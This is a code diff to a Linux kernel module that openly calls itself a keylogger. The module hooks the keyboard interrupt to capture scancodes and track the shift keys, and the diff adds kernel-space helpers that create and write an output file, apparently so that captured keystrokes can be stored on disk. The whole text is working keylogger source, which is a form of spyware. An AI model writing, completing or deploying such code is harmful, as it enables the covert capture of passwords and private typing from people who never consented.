@@ -10,17 +10,23 @@
 #define __KERNEL__
 #endif
 
+// keyboard constants/variables
 #define KBD_INPUT_PORT	0x60    /* address of keyboard input buffer */
-
 #define LEFT_SHIFT 0x2a
 #define RIGHT_SHIFT 0x36
 #define LEFT_SHIFT_RELEASE 0xaa
 #define RIGHT_SHIFT_RELEASE 0xb6
 int shiftPressed = 0;
 
+// output constants/variables
+#define OUTPUT_MODE 0644
+const char* path = "./output.txt"; //temporary
+struct file *outfile;
+
 // FUNCTION PROTOTYPES
-struct file *createFile(const char *path, int flags, int rights);
-int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
+struct file *createFile(const char *path);
+int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
+void closeFile(struct file *file);
 static irqreturn_t get_scancode(int irq, void *dev_id);
 void scancode_to_key(char scancode);
 void check_shift(unsigned char scancode);
@@ -46,7 +52,7 @@ const char *scancodes[][2] = {
   {"F11", "F11"}, {"F12", "F12"} };                                
 
 //Creating the output file
-struct file *createFile(const char *path, int flags, int rights) 
+struct file *createFile(const char *path) 
 {
     struct file *fileP = NULL;
     mm_segment_t oldFileSpace;
@@ -54,7 +60,7 @@ struct file *createFile(const char *path, int flags, int rights)
 
     oldFileSpace = get_fs();
     set_fs(get_ds());
-    fileP =  filp_open(path, flags, rights);
+    fileP = filp_open(path, O_CREAT | O_RDWR, OUTPUT_MODE);
     set_fs(oldFileSpace);
     if (IS_ERR(fileP)) {
         err = PTR_ERR(fileP);
@@ -64,7 +70,7 @@ struct file *createFile(const char *path, int flags, int rights)
 }
 
 //Write to the output file
-int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
+int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
 {
 	mm_segment_t oldFileSpace;
     int ret;
@@ -76,6 +82,11 @@ int file_write(struct file *file, unsigned long long offset, unsigned char *data
 
     set_fs(oldFileSpace);
     return ret;
+}
+
+void closeFile(struct file *file) 
+{
+    filp_close(file, NULL);
 }
 
 // gets the scancode of each pressed key
@@ -115,6 +126,8 @@ MODULE_DESCRIPTION("A kernel-based keylogger module");
 int __init init_keylogger(void)
 {
 	printk(KERN_INFO "Hello! Keylogger module successfully loaded.\n");
+	outfile = createFile(path);
+	writeToFile(outfile, 0, "test", 4); // TEMPORARY
 	request_irq(1, get_scancode, IRQF_SHARED, "kbd2", (void *)get_scancode);
 	return 0;
 }
@@ -123,6 +136,7 @@ void __exit exit_module(void)
 {
 	printk(KERN_INFO "Exiting keylogger kernel module.\n");
 	free_irq(1, (void *)get_scancode);
+	closeFile(outfile);
 	return;
 }
 
